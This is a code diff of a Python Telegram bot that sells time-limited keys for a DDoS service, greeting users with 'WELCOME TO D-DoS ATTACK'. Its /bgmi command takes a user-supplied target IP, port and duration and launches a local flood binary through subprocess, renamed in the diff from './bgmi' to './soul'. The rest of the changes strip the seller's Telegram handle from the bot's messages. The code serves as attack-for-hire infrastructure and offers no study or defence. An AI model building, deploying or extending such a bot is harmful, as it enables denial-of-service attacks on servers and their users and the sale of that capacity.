@@ -112,7 +112,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = "Usage: /genkey <amount> <hours/days>"
     else:
-        response = "𝐎𝐍𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐔𝐒𝐄💀𝐎𝐖𝐄𝐑 @SharpX72"
+        response = "𝐎𝐍𝐍𝐋𝐘 𝐎𝐖𝐍𝐄𝐑 𝐂𝐀𝐍 𝐔𝐒𝐄💀𝐎𝐖𝐄𝐑 @"
 
     await update.message.reply_text(response)
 
@@ -134,7 +134,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_keys()
             response = f"✅𝗞𝗲𝘆 𝗿𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!"
         else:
-            response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲 𝐛𝐮𝐲 𝐟𝐫𝐨𝐦 @SharpX72."
+            response = "𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐤𝐞𝐲 𝐛𝐮𝐲 𝐟𝐫𝐨𝐦 @."
     else:
         response = "Usage: /redeem <key>"
 
@@ -163,7 +163,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐍𝐎 𝐀𝐍𝐘𝐎𝐍𝐄 𝐏𝐋𝐀𝐍 𝐃𝐌 𝐅𝐎𝐑 𝐁𝐔𝐘 : - @SharpX72")
+        await update.message.reply_text("❌ 𝐘𝐎𝐔 𝐇𝐀𝐕𝐄 𝐍𝐎 𝐀𝐍𝐘𝐎𝐍𝐄 𝐏𝐋𝐀𝐍 𝐃𝐌 𝐅𝐎𝐑 𝐁𝐔𝐘 : - @")
         return
 
     if len(context.args) != 3:
@@ -174,7 +174,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
+    command = ['./soul', target_ip, port, duration, str(DEFAULT_THREADS)]
 
     process = subprocess.Popen(command)
     
@@ -186,7 +186,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("👋🏻WELCOME TO D-DoS ATTACK\nTHIS IS A TOOL POWERED BY​:-@SharpX72\n🤖TRY TO RUN THIS COMMANDS :- /help")
+        await update.message.reply_text("👋🏻WELCOME TO D-DoS ATTACK\nTHIS IS A TOOL POWERED BY​:-@\n🤖TRY TO RUN THIS COMMANDS :- /help")
         return
 
     if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
@@ -204,7 +204,7 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌𝐀𝐜𝐜𝐞𝐬𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐨𝐫 𝐮𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐛𝐮𝐲 𝐤𝐞𝐲 𝐟𝐫𝐨𝐦- @SharpX72")
+        await update.message.reply_text("❌𝐀𝐜𝐜𝐞𝐬𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐨𝐫 𝐮𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐛𝐮𝐲 𝐤𝐞𝐲 𝐟𝐫𝐨𝐦- @")
         return
 
     if user_id not in user_processes or user_processes[user_id]["process"].poll() is not None:
@@ -236,7 +236,7 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     await update.message.reply_text(response)
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await update.message.reply_text("𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:\n/redeem <𝐑𝐄𝐃𝐄𝐄𝐌 𝐊𝐄𝐘>\n/stop <𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏>\n/start <𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓>\n/genkey <𝐡𝐨𝐮𝐫𝐬/𝐝𝐚𝐲𝐬>\n𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐀𝐅𝐓𝐄𝐑 𝐁𝐔𝐘 𝐏𝐋𝐀𝐍, 𝐃𝐌 𝐅𝐎𝐑 𝐁𝐔𝐘 𝐘𝐎𝐔𝐑 𝐎𝐖𝐍 𝐏𝐋𝐀𝐍 : - @SharpX72")
+    await update.message.reply_text("𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒:\n/redeem <𝐑𝐄𝐃𝐄𝐄𝐌 𝐊𝐄𝐘>\n/stop <𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐎𝐏>\n/start <𝐅𝐎𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓>\n/genkey <𝐡𝐨𝐮𝐫𝐬/𝐝𝐚𝐲𝐬>\n𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒 𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐀𝐅𝐓𝐄𝐑 𝐁𝐔𝐘 𝐏𝐋𝐀𝐍, 𝐃𝐌 𝐅𝐎𝐑 𝐁𝐔𝐘 𝐘𝐎𝐔𝐑 𝐎𝐖𝐍 𝐏𝐋𝐀𝐍 : - @")
 
 if __name__ == '__main__':
     load_data()
